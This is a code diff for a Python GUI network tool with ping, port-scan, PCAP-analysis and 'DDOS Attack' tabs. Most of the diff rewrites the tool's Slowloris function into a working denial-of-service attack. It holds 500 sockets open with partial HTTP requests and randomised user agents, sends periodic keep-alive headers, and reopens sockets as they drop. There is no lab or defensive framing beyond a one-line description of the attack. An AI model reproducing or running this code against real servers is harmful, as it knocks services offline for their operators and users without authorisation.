@@ -16,6 +16,9 @@ import scapy.all as scapy
 attack_threads = []
 stop_attack_event = threading.Event()
 
+# Queue to handle thread-safe communication with the GUI
+output_queue = Queue()
+
 def ping_host(ip_str):
     """Pings a single host and returns True if reachable, False otherwise."""
     result = subprocess.run(['ping', '-n', '1', '-w', '500', ip_str], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -108,7 +111,6 @@ def perform_port_scan():
 def analyze_traffic(pcap_file, top_n=10):
     """Analyzes network traffic from a PCAP file and identifies heavily accessed hosts."""
     host_access_count = {}
-    # destination_ip_count = {}
 
     try:
         # Clear previous results and add analyzing message
@@ -132,7 +134,6 @@ def analyze_traffic(pcap_file, top_n=10):
         for host, count in top_n_accessed_hosts:
             result += f"{host} : {count} accesses\n"
 
-
         network_statistics_output_text_box.delete("1.0", tk.END)
         network_statistics_output_text_box.insert(tk.END, result)
     except FileNotFoundError:
@@ -148,50 +149,95 @@ def select_file():
         analyze_traffic(pcap_file, top_n)
 
 def slowloris_attack(target_host, target_port):
-    num_threads = 500
-    thread_pool = Queue()
+    num_sockets = 500
+    socket_list = []
+    user_agents = [
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    ]
+
+    def init_socket(ip):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+
+        try:
+            s.connect((ip, target_port))
+            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
+            ua = random.choice(user_agents)
+            s.send(f"User-Agent: {ua}\r\n".encode("utf-8"))
+            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+        except socket.error as e:
+            output_queue.put(f"Socket error: {e}\n")
+            s.close()
+            return None
+        return s
+
+    def slowloris_iteration():
+        try:
+            output_queue.put("Sending keep-alive headers...\n")
+            output_queue.put(f"Socket count: {len(socket_list)}\n")
+
+            for s in list(socket_list):
+                try:
+                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
+                except socket.error:
+                    socket_list.remove(s)
+
+            diff = num_sockets - len(socket_list)
+            if diff > 0:
+                output_queue.put(f"Creating {diff} new sockets...\n")
+                for _ in range(diff):
+                    s = init_socket(target_host)
+                    if s:
+                        socket_list.append(s)
+        except Exception as e:
+            output_queue.put(f"Error: {e}\n")
+            stop_attack_event.set()
 
     def attack():
         while not stop_attack_event.is_set():
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)  # Set timeout for connection attempts
-                s.connect((target_host, target_port))
-                s.send(b'GET / HTTP/1.1\r\n')
-                s.send(b'Host: ' + target_host.encode() + b'\r\n')
-                s.send(b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\r\n')
-                s.send(b'Accept: */*\r\n')
-                s.send(b'Accept-Language: en-US,en;q=0.9\r\n')
-                s.send(b'Connection: keep-alive\r\n')
-                s.send(b'\r\n')
-                while not stop_attack_event.is_set():
-                    try:
-                        s.send(b'X-a: ' + str(random.randint(1, 5000)).encode() + b'\r\n')
-                        time.sleep(1)
-                    except socket.error:
-                        break
-            except socket.error as e:
-                print(f"Connection error: {e}")
-                ddos_output_text_box.insert(tk.END, f"Connection error: {e}\n")
-                stop_attack_event.set()  # Signal to stop the attack
-                break
-            finally:
-                s.close()
+            slowloris_iteration()
+            time.sleep(15)  # Sleep time between header sends
 
-    def thread_worker():
-        while not stop_attack_event.is_set():
-            attack()
-            thread_pool.task_done()
+    # Initialize sockets
+    output_queue.put("Initializing sockets...\n")
+    for _ in range(num_sockets):
+        if stop_attack_event.is_set():
+            break
+        s = init_socket(target_host)
+        if s:
+            socket_list.append(s)
 
-    # Create and start threads
-    for _ in range(num_threads):
-        thread = threading.Thread(target=thread_worker)
-        thread.daemon = True
-        thread_pool.put(thread)
-        thread.start()
-        attack_threads.append(thread)
+    if stop_attack_event.is_set():
+        output_queue.put("Attack stopped before initialization completed.\n")
+        return
 
-    thread_pool.join()
+    # Start the attack
+    attack_thread = threading.Thread(target=attack)
+    attack_thread.start()
+    attack_threads.append(attack_thread)
 
 def start_ddos_attack():
     global stop_attack_event
@@ -223,6 +269,12 @@ def stop_ddos_attack():
 
     ddos_output_text_box.insert(tk.END, "Attack stopped!\n")
 
+def process_output_queue():
+    while not output_queue.empty():
+        msg = output_queue.get()
+        ddos_output_text_box.insert(tk.END, msg)
+        ddos_output_text_box.yview(tk.END)
+    window.after(100, process_output_queue)
 
 # Create the main window
 window = ctk.CTk()
@@ -297,7 +349,6 @@ port_scan_output_text_box.pack(side="left", fill="both", expand=True)
 
 port_scan_scrollbar = ctk.CTkScrollbar(master=port_scan_output_frame, command=port_scan_output_text_box.yview)
 port_scan_scrollbar.pack(side="right", fill="y")
-
 port_scan_output_text_box.configure(yscrollcommand=port_scan_scrollbar.set)
 
 # Network Statistics tab content
@@ -319,7 +370,6 @@ network_statistics_output_text_box.pack(side="left", fill="both", expand=True)
 
 network_statistics_scrollbar = ctk.CTkScrollbar(master=network_statistics_output_frame, command=network_statistics_output_text_box.yview)
 network_statistics_scrollbar.pack(side="right", fill="y")
-
 network_statistics_output_text_box.configure(yscrollcommand=network_statistics_scrollbar.set)
 
 # DDOS Attack tab content
@@ -359,6 +409,9 @@ ddos_output_text_box.configure(yscrollcommand=ddos_scrollbar.set)
 
 # Display descriptions for attack types in the output box initially
 ddos_output_text_box.insert(tk.END, "Slowloris Attack: A type of Denial-of-Service (DoS) attack that sends partial HTTP requests to keep many connections to the target web server open and hold them open as long as possible.\n\n")
+
+# Process output queue to update the GUI from the main thread
+window.after(100, process_output_queue)
 
 # Run the Tkinter event loop
 window.mainloop()
